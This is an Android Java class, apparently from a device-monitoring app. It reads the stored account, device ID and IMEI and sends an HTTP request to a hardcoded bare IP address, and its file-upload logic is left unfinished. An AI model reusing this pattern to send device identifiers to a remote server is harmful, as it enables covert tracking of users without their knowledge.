package com.inet.android.request;

import java.io.File;

import org.apache.http.Header;

import android.content.Context;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;

import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;
/**
 * FileRequest class is used to send requests to the server (for files)
 * @author johny homicide
 *
 */

public class FileRequest {
	Context mContext;
	private static String URL = "http://188.226.208.100/" + "informative";
	SharedPreferences sp;

	public FileRequest(Context context, String path, String time) {
		this.mContext = context;
	}
	public FileRequest(Context context, String path, int minute, String time) {
		this.mContext = context;
	}
	
	public void sendRequest() {
		sp = PreferenceManager.getDefaultSharedPreferences(this.mContext);
//		File myFile = new File(path);

		RequestParams params = new RequestParams();
		params.put("account", sp.getString("account", "0000"));
		params.put("device", sp.getString("device", "0000"));
		params.put("imei", sp.getString("imei", "0000"));
		params.put("data", "data");

		AsyncHttpClient client = new AsyncHttpClient();
		client.get(URL, new AsyncHttpResponseHandler() {

			@Override
			public void onStart() {
				// called before request is started
			}

			@Override
			public void onRetry(int retryNo) {
				// called when request is retried
			}

			@Override
			public void onFailure(int arg0, Header[] arg1, byte[] arg2,
					Throwable arg3) {
				// TODO Auto-generated method stub

			}

			@Override
			public void onSuccess(int arg0, Header[] arg1, byte[] arg2) {
				// TODO Auto-generated method stub

			}
		});
	}
}
